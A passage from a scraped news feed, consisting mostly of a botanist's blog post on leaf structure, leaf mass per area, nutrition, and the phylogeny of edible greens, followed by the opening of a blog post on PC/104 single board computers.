<div data-shortcode="caption" id="attachment_941"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg"><img loading="lazy" aria-describedby="caption-attachment-941" data-attachment-id="941" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/olympus-digital-camera-2/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg" data-orig-size="2288,1712" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;C770UZ&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1092890035&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;6.3&quot;,&quot;iso&quot;:&quot;105&quot;,&quot;shutter_speed&quot;:&quot;0.033333333333333&quot;,&quot;title&quot;:&quot;OLYMPUS DIGITAL CAMERA&quot;}" data-image-title="OLYMPUS DIGITAL CAMERA" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg?w=150&amp;h=112" alt="Giant coconut palm (Cocos nucifera) fronds dwarf me" width="150" height="112" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg?w=150&amp;h=112 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/p8190223.jpg?w=300&amp;h=224 300w" sizes="(max-width: 150px) 100vw, 150px"></a></p><p id="caption-attachment-941">Giant coconut palm (<em>Cocos nucifera</em>) fronds dwarf me</p></div>
<p>Most of the 300,000 + plant species have leaves, and the function of all of them is to perform photosynthesis.&nbsp; They are the ultimate source for all of the oxygen and food for the rest of the food chain and help regulate the global carbon and water cycles.&nbsp; They are also nutrition superstars.&nbsp; To figure out why greens are good for you and whether all leaves are equal in this regard, we need to take quick look at global leaf structural variability and broad evolutionary patterns in the species that make their way onto our tables.<span id="more-937"></span></p>
<div data-shortcode="caption" id="attachment_942"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg"><img loading="lazy" aria-describedby="caption-attachment-942" data-attachment-id="942" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/big-sagebrush-detail3/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg" data-orig-size="334,436" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="big-sagebrush-detail3" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg?w=230" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg?w=334" src="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg?w=114&amp;h=150" alt="Leaves of sagebrush (Artemisia tridentata) are smaller than my fingernails" width="114" height="150" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg?w=114&amp;h=150 114w, https://botanistinthekitchen.files.wordpress.com/2013/04/big-sagebrush-detail3.jpg?w=228&amp;h=298 228w" sizes="(max-width: 114px) 100vw, 114px"></a></p><p id="caption-attachment-942">Leaves of sagebrush (<em>Artemisia tridentata</em>) are smaller than my fingernails</p></div>
<p>Across the global flora leaves are extraordinarily structurally variable.&nbsp; They vary in size from a tiny duckweed leaf to a huge palm frond, and in thickness from a thin lettuce leaf to a thick leaf of a succulent aloe or pine needle.&nbsp; We don‚Äôt fully understand yet why leaves are so structurally variable across species. My colleagues and I <a title="Osnas et al. Science 2013" href="http://www.sciencemag.org/content/early/2013/03/27/science.1231574" target="_blank">recently published a paper</a> demonstrating that across the global flora leaf nutrient concentrations and physiological rates of maximum photosynthetic carbon gain and respiratory carbon loss change in proportion to leaf area more strongly than they change in proportion to leaf mass.&nbsp; We demonstrate the consequences of this area-proportionality of leaf traits for how we measure, analyze and use these leaf traits in models of the global carbon cycle.</p>
<div data-shortcode="caption" id="attachment_951"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg"><img loading="lazy" aria-describedby="caption-attachment-951" data-attachment-id="951" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/privetleaf/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg" data-orig-size="879,592" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="PrivetLeaf" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg?w=150&amp;h=101" alt="Microscope cross section of a privet leaf.  Photosynthesis is performed by the columnar cells of the palisade parenchyma, underneath the upper epidermis.  Photo source unknown." width="150" height="101" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg?w=150&amp;h=101 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/privetleaf.jpg?w=300&amp;h=202 300w" sizes="(max-width: 150px) 100vw, 150px"></a></p><p id="caption-attachment-951">Microscope cross section of a privet leaf. Most photosynthesis is performed by the columnar cells of the palisade parenchyma, underneath the upper epidermis. Photo source unknown.</p></div>
<p>Of relevance here, however, is that the high area-proportionality of leaf traits simply means that the parts of the leaf that are most beneficial for humans (digestible protein, vitamins, minerals, carbohydrates, digestible fiber) are likely proportional in many species to the leaf‚Äôs photosynthetic apparatus, which is clustered in a relatively thin band of cells beneath the epidermis (see image). &nbsp;Adding thickness to a leaf doesn‚Äôt necessarily add nutritious tissue and might instead add mostly fibrous, indigestible structural material (see agave photo below). &nbsp;This does not mean that the thinner the leaf, the more nutritious it is; this is just a general tendency across all plants. &nbsp;Scaled up to the level of the whole plant, though, we see that leaves have the highest ratio of nutritious material (digestible protein, vitamins and minerals, fiber) to indigestible material (for most species). &nbsp;Some fruits probably come close, but fruit is rare, and leaves are abundant.</p>
<div data-shortcode="caption" id="attachment_943"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg"><img aria-describedby="caption-attachment-943" data-attachment-id="943" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/blue-agave/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg" data-orig-size="512,384" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="blue-agave" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg?w=512" src="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg?w=625" alt="Blue agave (Agave tequilana) hearts ready to be turned into agave syrup and tequila, showing cross section of the base of the very thick (high LMA) leaves.  The dark bluish-green outer leaf layer is where all the photosynthesis takes place and is where the nutrition in the leaf is primarily located, from the perspective of an herbivore.  The white inner part of the leaves consists of structural material and storage.  The inner fibers of the leaves are used to make rope!  Photo source unknown." srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg 512w, https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg?w=150 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/blue-agave.jpg?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"></a></p><p id="caption-attachment-943">Blue agave (<em>Agave tequilana</em>) hearts ready to be turned into agave syrup and tequila, showing cross section of the base of the very thick (high LMA) leaves, which have been hacked off with a machete. The dark bluish-green outer leaf layer is where all the photosynthesis takes place and is where the nutrition in the leaf is primarily located, from the perspective of an herbivore. The white inner part of the leaves consists of structural material and storage. The inner fibers of the leaves are used to make rope! Photo source unknown.</p></div>
<p>One of the key variables modulating area- vs mass-proportionality of leaf traits is leaf mass per unit leaf area (LMA), which increases with leaf thickness and density. &nbsp;Lettuce leaves have very low LMA, pine needles and holly leaves have high LMA.&nbsp; Although there is very little data on the subject, the leaves that we eat tend to fall on the low end of the global LMA spectrum, shown here for a global dataset of more than 2500 wild species.</p>
<div data-shortcode="caption" id="attachment_938"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg"><img aria-describedby="caption-attachment-938" data-attachment-id="938" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/2010_06_02_lma_hist/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg" data-orig-size="1400,1400" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="2010_06_02_LMA_hist" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=625" alt="LMA (g*m^-2) for over 2500 wild species (data from Wright et al. 2004).  Thin leaves have low LMA (left side), thick leaves have high LMA (right side).  LMA varies by 3 orders of magnitude across the global floral.  " srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=625 625w, https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=1250 1250w, https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=150 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=300 300w, https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=768 768w, https://botanistinthekitchen.files.wordpress.com/2013/04/2010_06_02_lma_hist.jpg?w=1024 1024w" sizes="(max-width: 625px) 100vw, 625px"></a></p><p id="caption-attachment-938">Histogram of LMA (g*m^-2) for over 2500 wild species (data from <a title="Wright et al. 2004" href="http://www.nature.com/nature/journal/v428/n6985/abs/nature02403.html">Wright et al. 2004</a>). ‚ÄúFrequency‚Äù is number of species in the data with a given LMA. &nbsp;Most species have relatively low LMA. &nbsp;Thin leaves have low LMA (left side), thick and/or very dense leaves have high LMA (right side). LMA varies by 3 orders of magnitude across the global floral.</p></div>
<p>Leaf tenderness‚Äîreducing LMA‚Äìis certainly a trait that has undergone selection in cultivated varieties.&nbsp; In species with varietals that have undergone selection on different structures, the varieties in which selection has been directed at the leaves invariably have more tender, less bitter, and larger leaves than do varieties in which selection has been directed at different structures, such as the roots.&nbsp; For example, chard has larger and more tender greens than do beets (both <i>Beta vulgaris</i>, Caryophyllales); celery grown for stalks and leaves is more tender than the aboveground portion of the celery varietal grown for its root (both <i>Apium graveolens</i>, Apiales); and Siberian kale varieties have more tender leaves than do rutabaga varieties (both <i>Brassica napus</i>, Brassicales).</p>
<div data-shortcode="caption" id="attachment_955"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg"><img loading="lazy" aria-describedby="caption-attachment-955" data-attachment-id="955" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/celeryroot/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg" data-orig-size="2112,2816" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.1&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX230 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1361081560&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.3&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="celeryroot" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg?w=225" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg?w=112&amp;h=150" alt="small, tough stems and leaves on celery root" width="112" height="150" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg?w=112&amp;h=150 112w, https://botanistinthekitchen.files.wordpress.com/2013/04/celeryroot.jpg?w=224&amp;h=300 224w" sizes="(max-width: 112px) 100vw, 112px"></a></p><p id="caption-attachment-955">small, tough stems and leaves on celery root</p></div>
<p>Kale and collards, grown for their leaves, have leaves that are more tender than those of conspecific <i>Brassica oleracea</i> grown primarily for other structures:&nbsp; kohlrabi, broccoli, cauliflower, Brussels sprouts (and for those of you keeping track at home, in the <a title="The extraordinary diversity of Brassica&nbsp;oleracea" href="https://botanistinthekitchen.wordpress.com/2012/11/05/the-extraordinary-diversity-of-brassica-oleracea/" target="_blank"><i>B. oleracea</i></a>, <a title="Thanksgiving turnips and the diversity of the genus&nbsp;Brassica" href="https://botanistinthekitchen.wordpress.com/2012/11/20/598/" target="_blank"><i>Brassica</i></a>, and<a title="The most political vegetables: A whirlwind tour of the edible&nbsp;crucifers" href="https://botanistinthekitchen.wordpress.com/2012/11/20/the-most-political-vegetables-a-whirlwind-tour-of-the-edible-crucifers/" target="_blank"> Brassicaceae posts</a>,<i> </i>I erroneously lumped all kales into <i>Brassica oleracea</i>‚Äî<a title="Brassica napus kales" href="http://seedambassadors.org/Mainpages/still/napuskale/napuskale.htm" target="_blank">some of them are <i>B. napus</i></a>, including my favorite variety: Red Russian kale).&nbsp; Don‚Äôt dare throw out your beet, celeriac, rutabaga or <i>B. oleracea </i>greens, though, if you‚Äôre lucky enough to get them‚Äîthey need a bit more cooking or tenderizing, but they‚Äôre still delicious and nutritious.&nbsp; At least put your celery root greens in stock.&nbsp; LMA also varies within a varietal based on growing conditions.&nbsp; Leaves grown in sun have higher LMA than leaves grown in shade.&nbsp; The impact of growing conditions within species, however, will have to wait for another time.</p>
<p>LMA is hardly the only determinant of which species make it onto our plates.&nbsp; Otherwise, we‚Äôd have our pick of hundreds of species on the low-LMA end of the global curve.&nbsp; Instead, we can put most of our greens species on a fairly legible phylogenetic tree in need of only a few disclaimer paragraphs of omissions.</p>
<div data-shortcode="caption" id="attachment_949"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg"><img aria-describedby="caption-attachment-949" data-attachment-id="949" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/2013_04_05_greens_phylo-2/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg" data-orig-size="1899,1105" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="2013_04_05_greens_phylo" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=625" alt="The greens tree: phylogenetic relationships among species whose leaves we eat. Taxon branches are shaded according to taxonomic order. Notice that 4 families dominate the leafy species we eat. Click here for a refresher on reading trees and on plant evolutionary history." srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=625 625w, https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=1250 1250w, https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=150 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=300 300w, https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=768 768w, https://botanistinthekitchen.files.wordpress.com/2013/04/2013_04_05_greens_phylo1.jpg?w=1024 1024w" sizes="(max-width: 625px) 100vw, 625px"></a></p><p id="caption-attachment-949">The greens tree: phylogenetic relationships among species whose leaves we eat. Taxon branches are shaded according to taxonomic order. &nbsp;<a title="Phylogenetic tree&nbsp;view" href="https://botanistinthekitchen.wordpress.com/the-plant-food-tree-of-life/phylogenetic-tree-view/">Click here for a refresher</a> on reading trees and on plant evolutionary history.</p></div>
<p>Like many phylogenetic trees of more than a handful of species, this tree of our ‚Äúgreens species‚Äù commits sins of both commission and omission in the interest of producing a readable image. Omission because the species on the tree do not comprise an exhaustive list of species whose leaves people around the globe regularly consume. Commission because I included a few unusual items, such as sweet potato leaves (<i>Ipomoea</i>, Solanales), and pea shoots (Fabales), and a few taxa are single representatives of a large group.&nbsp; Sister to sweet potato on the tree, for example, is the entire family Lamiaceae, the mints.</p>
<div data-shortcode="caption" id="attachment_953"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg"><img loading="lazy" aria-describedby="caption-attachment-953" data-attachment-id="953" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/oregano/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg" data-orig-size="3648,2736" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DSC-TX10&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1338296992&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.43&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="oregano" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg?w=150&amp;h=112" alt="oregano, a mint" width="150" height="112" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg?w=150&amp;h=112 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/oregano.jpg?w=300&amp;h=224 300w" sizes="(max-width: 150px) 100vw, 150px"></a></p><p id="caption-attachment-953">oregano, a mint</p></div>
<p>We mostly use leaves from the mints as herbs and spices:&nbsp; peppermint and spearmint (<i>Mentha </i>sp.), basil (<i>Ocimum</i> sp.), thyme (<i>Thymus</i> sp.), oregano and marjoram (<i>Origanum</i> sp.), rosemary (<i>Rosmarinus</i> sp.), lemon balm (<i>Melissa</i> sp.), lavender (<i>Lavandula</i> sp.), shiso (<i>Perilla frutescens</i>), bee balm (<i>Monarda</i> sp.), and mountain mint (<i>Pycnanthemum</i> sp.).&nbsp; Also, scallions are the only representatives on the tree from the genus <i>Allium</i> in the monocot order Asparagles, which includes many edible species, the leaves of some of which are regularly employed:&nbsp; garlic, <a title="A look at&nbsp;leeks" href="https://botanistinthekitchen.wordpress.com/2013/03/03/a-look-at-leeks/" target="_blank">leeks</a>, ramps, and onions.</p>
<p>I included some of the more exotic greens in the greens tree both to avoid rousing the ire of their champions and because I was a bit shocked that some large, charismatic orders that feature prominently in the diet at large are reduced to single entries on the greens tree or are gone altogether, meaning we primarily use roots, stems, fruits or seeds from these clades, not leaves.&nbsp; Granted, this ‚Äúgreens tree‚Äù is mostly a tree of ‚Äúgreens obtained from Whole Foods and summer farmer‚Äôs markets in the continental United States.‚Äù</p>
<div data-shortcode="caption" id="attachment_952"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg"><img loading="lazy" aria-describedby="caption-attachment-952" data-attachment-id="952" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/chickweed/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DSC-TX10&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1354725785&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.43&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.033333333333333&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="chickweed" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg?w=300" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg?w=625" src="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg?w=150&amp;h=84" alt="chickweed in the spinach" width="150" height="84" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg?w=150&amp;h=84 150w, https://botanistinthekitchen.files.wordpress.com/2013/04/chickweed.jpg?w=300&amp;h=168 300w" sizes="(max-width: 150px) 100vw, 150px"></a></p><p id="caption-attachment-952">chickweed in the spinach</p></div>
<p>I‚Äôve included a few weedy, wild things that I pick regularly and that one can actually occasionally pay money for at the farmer‚Äôs market:&nbsp; nettle (<i>Urtica dioica</i>, Rosales), chickweed (<i>Stellaria media</i>, Caryophyllales), miner‚Äôs lettuce (<i>Claytonia perfoliata</i>, Caryophyllales), purslane (<i>Portulaca oleracea</i>, Caryophyllales), and dandelion (<i>Taraxacum officinale</i>, Asterales).&nbsp; Largely, however, I‚Äôve omitted species whose leaves are technically edible, at least in small doses at some point in their life cycle, but that are reduced to curiosities at the modern American table, not staples.&nbsp; Therefore, please hold your fire if you‚Äôre shaking your fist at the tree because it omits the young beech (<i>Fagus grandifolia</i>, Fagales), sassafras (<i>Sassafras albidum</i>, Laureles), or violet (<i>Viola odorata</i>, Malpighiales) leaves you like to nibble on when you hike east of the Mississippi. Fern fiddlehead (assorted Polypodiales) enthusiasts, too, forgive me. &nbsp;We use some leaves to prepare other food: &nbsp;banana leaves and corn husks to wrap&nbsp;<em>tamales</em>, and palm fronds and fig leaves to wrap fish for baking or grilling. &nbsp;I salute these leaves, but they‚Äôre not on the tree. &nbsp;Some are gone simply because I didn‚Äôt have room, such as many of the <a title="The most political vegetables: A whirlwind tour of the edible&nbsp;crucifers" href="https://botanistinthekitchen.wordpress.com/2012/11/20/the-most-political-vegetables-a-whirlwind-tour-of-the-edible-crucifers/">crucifer greens</a>, and asterids chrysanthemum, borage and comfrey (although those last two haven‚Äôt been placed to order yet and would therefore have been difficult to place within the asterids anyway).</p>
<div data-shortcode="caption" id="attachment_957"><p><a href="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg"><img loading="lazy" aria-describedby="caption-attachment-957" data-attachment-id="957" data-permalink="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/tea/" data-orig-file="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg" data-orig-size="1080,1920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4.5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DSC-TX10&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1354799125&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.43&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.002&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="tea" data-image-description="" data-medium-file="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg?w=169" data-large-file="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg?w=576" src="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg?w=84&amp;h=150" alt="Camelia sinensis--tea--in flower" width="84" height="150" srcset="https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg?w=84&amp;h=150 84w, https://botanistinthekitchen.files.wordpress.com/2013/04/tea.jpg?w=168&amp;h=300 168w" sizes="(max-width: 84px) 100vw, 84px"></a></p><p id="caption-attachment-957"><em>Camelia sinensis</em>‚Äìtea‚Äìin flower</p></div>
<p>I left off plants whose leaves are regularly consumed as infusions (‚Äútea‚Äù), including, for example, the actual tea plant (<i>Camelia sinensis, </i>Ericales), yerba mat√© (<i>Ilex</i> <i>paraguariensis</i>, Aquifoliales), raspberry leaf (<i>Rubus </i>sp., Rosales), yerba santa (<a title="Varieties of the pepper&nbsp;experience" href="https://botanistinthekitchen.wordpress.com/2012/10/22/varieties-of-the-pepper-experience/" target="_blank"><i>Piper</i> sp</a>., Piperales), blueberry leaf (<i>Vaccinium</i> sp., Ericales), conifer needles (Pinales), and oatstraw (<i>Avena</i> sp., Poales), each of which would add another order to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/">https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/</a></em></p>]]>
            </description>
            <link>https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806012</guid>
            <pubDate>Sat, 16 Jan 2021 22:13:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HannStar EMC-3412 a retro x86 SBC]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25805877">thread link</a>) | @todsacerdoti
<br/>
January 16, 2021 | https://blog.jmdawson.co.uk/hannstar-emc-3412-a-retro-x86-sbc/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/hannstar-emc-3412-a-retro-x86-sbc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3445">

	

	<div>
		

<h2><span id="Introduction"></span>Introduction<span></span></h2>



<div><p>Single board computers aren‚Äôt anything new infact they have existed since 1976 when the dyna-micro was released based on the Intel C8080A CPU. </p><p>Since then they have been used in many embedded applications from digital signage to satellite and aerospace applications, in 2012 the Raspberry Pi foundation released the Raspberry Pi Model B which redefined the SBC standard with many manufacturers producing boards based on the Raspberry Pi form factors and GPIO standard ever since but what was the prior standard? </p></div>



<div><p>Back in 1987 a company called Ampro released an SBC which would later define a standard known as PC/104 (or PC104) in 1992. In 1997 the PC/104-plus form factor was developed which included PCI and in 2008 the PC/104-Express was the final revision including a PCI-Express Bus. </p><p>The PC-104 is based on the IBM XT bus which includes 64 pins and the IBM AT bus which includes 40 pins hence the name PC/104. </p></div>



<p>The PC/104 pin out can be found here: <a href="http://www.interfacebus.com/Design_PC104_Pinout.html" target="_blank" rel="noreferrer noopener">http://www.interfacebus.com/Design_PC104_Pinout.html</a></p>



<p>The PC/104 standard is designed to be stack-able with different add on cards available. </p>



